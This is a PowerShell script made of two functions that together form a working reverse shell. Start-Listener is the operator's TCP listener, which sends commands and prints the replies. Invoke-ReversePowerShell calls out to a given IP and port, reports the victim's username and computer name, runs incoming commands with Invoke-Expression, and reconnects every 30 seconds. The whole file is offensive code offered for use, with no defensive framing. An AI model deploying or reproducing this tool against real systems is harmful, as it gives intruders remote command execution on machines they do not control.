Function Start-Listener {
[CmdletBinding()]
    param(
        [Parameter(
            Mandatory=$True,
            Position=0,
            ValueFromPipeline=$False,
            HelpMessage='Enter a port to listen on. Valid ports are between 1 and 65535'
            )] # End Parameter
        [ValidateRange(1,65535)]
        [int32]$Port
    ) # End param

        Write-Host ("Listening on [0.0.0.0] (port " + $Port + ")") -ForegroundColor 'Green'

        $Socket = New-Object System.Net.Sockets.TcpListener('0.0.0.0', $Port);

        If($Socket -eq $Null)
        {

            Exit

        } # End If

      $Socket.Start()

      $Client = $Socket.AcceptTcpClient()

      Write-Host "[*] Connection Established." -ForegroundColor 'Green'

      $Stream = $Client.GetStream()

      $Writer = New-Object System.IO.StreamWriter($Stream)
      $Buffer = New-Object System.Byte[] 2048
      $Encoding = New-Object System.Text.AsciiEncoding

      Do
      {

          $Command = Read-Host

          $Writer.WriteLine($Command)

          $Writer.Flush();

          If($Command -eq "exit")
          {

              Break

          } # End If

          $Read = $Null

          While($Stream.DataAvailable -or $Read -eq $Null)
          {

              $Read = $Stream.Read($Buffer, 0, 2048)

              $Out = $Encoding.GetString($Buffer, 0, $Read)

              Write-Output $Out

          } # End While

      } While ($Client.Connected -eq $True) # End Do While Loop

      $Socket.Stop()

      $Client.Close();

      $Stream.Dispose()

} # End Function Start-Listener

Function Invoke-ReversePowerShell {
    [CmdletBinding()]
        param(
            [Parameter(
                Mandatory=$True,
                Position=0,
                ValueFromPipeline=$True,
                ValueFromPipelineByPropertyName = $True
            )] # End Parameter
                [ValidateNotNullorEmpty()]
            [IPAddress]$IpAddress,

            [Parameter(
                Mandatory=$True,
                Position=1,
                ValueFromPipeline=$False
            )] # End Parameter
                [ValidateNotNullorEmpty()]
                [ValidateRange(1,65535)]
            [int32]$Port
        ) # End param

    $GodsMakeRules = "They dont follow them"

    While ($GodsMakeRules -eq 'They dont follow them')
    {

        $ErrorActionPreference = 'Continue'

        Try
        {

            Write-Host "Connection attempted. Check your listener." -ForegroundColor 'Green'

            $Client = New-Object System.Net.Sockets.TCPClient($IpAddress,$Port)

            $Stream = $Client.GetStream()

            [byte[]]$Bytes = 0..255 | ForEach-Object -Process {0}

            $SendBytes = ([Text.Encoding]::ASCII).GetBytes("$env:USERNAME connected to $env:COMPUTERNAME "+"`n`n" + "PS " + (Get-Location).Path + "> ")

            $Stream.Write($SendBytes,0,$SendBytes.Length);$Stream.Flush()

            While(($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
            {
                $Command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0, $i)

                If($Command.StartsWith("kill-link"))
                {

                    Clear-Host;

                    $Client.Close()

                    Exit

                } # End If

                Try
                {

                    # Executes commands
                    $ExecuteCmd = (Invoke-Expression -Command $Command -ErrorAction SilentlyContinue | Out-String )

                    $ExecuteCmdAgain  = $ExecuteCmd + "PS " + (Get-Location).Path + "> "

                } # End Try
                Catch
                {

                    $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage

                    $ExecuteCmdAgain  =  "ERROR: " + $Error[0].ToString() + "`n`n" + "PS " + (Get-Location).Path + "> "

                    Clear-Host

                } # End Catch

                $ReturnBytes = ([Text.Encoding]::ASCII).GetBytes($ExecuteCmdAgain)

                $Stream.Write($ReturnBytes,0,$ReturnBytes.Length)

                $Stream.Flush()

            } # End While

        } # End Try
        Catch
        {
            Write-Host "There was an initial connection error. Retrying in 30 seconds..." -ForegroundColor 'Red'

            If($Client.Connected)
            {

                $Client.Close()

            } # End If

            Clear-Host

            Start-Sleep -s 30

        } # End Catch

    } # End While

} # End Function Invoke-ReversePowerShell
